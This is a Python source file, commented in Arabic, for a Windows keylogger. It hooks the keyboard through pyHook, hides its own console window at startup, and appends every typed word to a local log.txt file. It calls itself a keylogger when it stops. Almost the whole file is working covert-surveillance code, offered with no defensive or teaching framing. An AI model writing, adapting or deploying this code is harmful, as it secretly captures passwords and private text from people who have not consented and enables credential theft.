import win32gui
import win32con
import pythoncom
import pyHook
import threading
import time
import os

# إعدادات المسار والحفظ
LOG_FILE = "log.txt"

class Logger:
    def __init__(self):
        self.current_word = ""
        
    def log_key(self, key):
        """معالجة مفتاح وضغطه وإضافته للسجل"""
        # تجاهل أحداث النافذة فقط
        if key in [u'WM_KEYDOWN', u'WM_SYSKEYDOWN']:
            return

        # التعامل مع المفاتيح الخاصة
        if key == 'Backspace':
            if self.current_word:
                self.current_word = self.current_word[:-1] 
                
        elif key == 'Enter':
            self.current_word += '\n'
            self.write_to_file()
            
        elif key == ' ':
            self.write_to_file()
            
        elif key == 'Tab':
            self.current_word += '    '
            
        else:
            try:
                if len(key) == 1:
                    self.current_word += key
            except:
                pass

    def write_to_file(self):
        """كتابة النص المتراكم إلى الملف"""
        if self.current_word:
            with open(LOG_FILE, 'a', encoding='utf-8') as f:
                f.write(self.current_word)
            self.current_word = ""

    def onKeyboardEvent(self, event):
        """دالة الاستماع لضغطات المفاتيح"""
        if event.MessageName not in [u"key up", u"sys key up"]:
            self.log_key(event.Key)
        return True

def hide_window():
    """إخفاء نافذة CMD إذا كانت تعمل منها"""
    hwnd = win32gui.GetForegroundWindow()
    if hwnd:
        win32gui.ShowWindow(hwnd, win32con.SW_HIDE)

if __name__ == "__main__":
    hide_window()
    logger = Logger()
    hm = pyHook.HookManager()
    hm.KeyDown = logger.onKeyboardEvent
    hm.HookKeyboard()

    try:
        pythoncom.PumpMessages()
    except KeyboardInterrupt:
        print("\nStopping keylogger...")
